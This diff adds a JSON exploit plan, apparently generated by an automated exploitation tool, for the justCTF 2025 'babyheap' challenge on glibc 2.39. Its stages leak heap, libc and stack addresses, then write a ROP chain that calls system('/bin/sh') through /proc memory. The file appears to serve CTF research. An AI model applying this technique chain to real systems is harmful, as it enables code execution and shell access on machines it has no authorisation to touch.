@@ -1,0 +1,157 @@
+{
+  "target": {
+    "name": "primitives_only",
+    "address_expr": "none",
+    "exploit_type": "primitives"
+  },
+  "stages": [
+    {
+      "name": "leak_heap",
+      "technique": "decrypt_safe_linking",
+      "produces": [
+        "heap_leak"
+      ],
+      "ir": [
+        {
+          "op": "ALLOC",
+          "tag": "c0",
+          "size": 64,
+          "data_expr": "b'A' * $ALLOC_SZ"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "c1",
+          "size": 64,
+          "data_expr": "b'B' * $ALLOC_SZ"
+        },
+        {
+          "op": "FREE",
+          "tag": "c0"
+        },
+        {
+          "op": "VIEW",
+          "tag": "c0",
+          "save_as": "xor_key",
+          "note": "read_first_8_bytes_tcache_fd_xor_key"
+        },
+        {
+          "op": "CALC",
+          "var": "heap_base",
+          "expr": "xor_key << 12"
+        }
+      ],
+      "params": {},
+      "kb_confidence": 10,
+      "how2heap_sources": [
+        "/home/kiwi/UIT-DoAn/NT521/data/how2heap_sources/glibc_2.39/decrypt_safe_linking.c"
+      ]
+    },
+    {
+      "name": "leak_libc",
+      "technique": "proc_mem_libc_leak",
+      "produces": [
+        "libc_leak"
+      ],
+      "ir": [
+        {
+          "op": "PROC_MEM_MAPS",
+          "save_as": "libc.address",
+          "note": "parse_maps_for_libc_base"
+        },
+        {
+          "op": "CALC",
+          "var": "libc.address",
+          "expr": "libc.address",
+          "note": "set_libc_from_maps"
+        }
+      ],
+      "params": {},
+      "kb_confidence": 10,
+      "how2heap_sources": []
+    },
+    {
+      "name": "leak_stack",
+      "technique": "proc_mem_stack_leak",
+      "produces": [
+        "stack_leak"
+      ],
+      "ir": [
+        {
+          "op": "CALC",
+          "var": "_environ_addr",
+          "expr": "libc.symbols['environ']"
+        },
+        {
+          "op": "PROC_MEM_READ",
+          "addr_expr": "_environ_addr",
+          "size": 8,
+          "save_as": "_environ_val",
+          "note": "read_environ_via_proc_mem"
+        },
+        {
+          "op": "CALC",
+          "var": "_ret_pattern",
+          "expr": "libc.address + 0x2a1ca",
+          "note": "main_return_address_pattern"
+        },
+        {
+          "op": "PROC_MEM_SCAN",
+          "start_expr": "_environ_val - 0x300",
+          "end_expr": "_environ_val - 0x80",
+          "pattern_expr": "_ret_pattern",
+          "save_as": "stack_leak",
+          "note": "scan_stack_for_return_addr"
+        }
+      ],
+      "params": {},
+      "kb_confidence": 10,
+      "how2heap_sources": []
+    },
+    {
+      "name": "write_arbitrary",
+      "technique": "proc_mem_stack_write",
+      "produces": [
+        "arbitrary_write"
+      ],
+      "ir": [
+        {
+          "op": "ROP_CHAIN",
+          "var": "_rop_chain",
+          "gadgets": [
+            "ret",
+            "ret",
+            "ret",
+            "pop_rdi",
+            "binsh",
+            "system"
+          ],
+          "note": "ret3 + pop_rdi_ret + binsh + system"
+        },
+        {
+          "op": "PROC_MEM_WRITE",
+          "addr_expr": "stack_leak",
+          "data_expr": "_rop_chain",
+          "note": "write_rop_chain_to_stack"
+        }
+      ],
+      "params": {},
+      "kb_confidence": 10,
+      "how2heap_sources": []
+    }
+  ],
+  "confidence": 1.0,
+  "metadata": {
+    "glibc_version": "2.39",
+    "has_safe_linking": true,
+    "max_slots": 20,
+    "menu_prompt": "b'> '",
+    "alloc_choice": "1",
+    "free_choice": "4",
+    "view_choice": "2",
+    "edit_choice": "3",
+    "exit_choice": "0",
+    "libc_path": "/home/kiwi/UIT-DoAn/NT521/benchmarks/justCTF-2025-babyheap/libc.so.6",
+    "binary_path": "/home/kiwi/UIT-DoAn/NT521/benchmarks/justCTF-2025-babyheap/binary"
+  },
+  "diagnosis": {}
+}
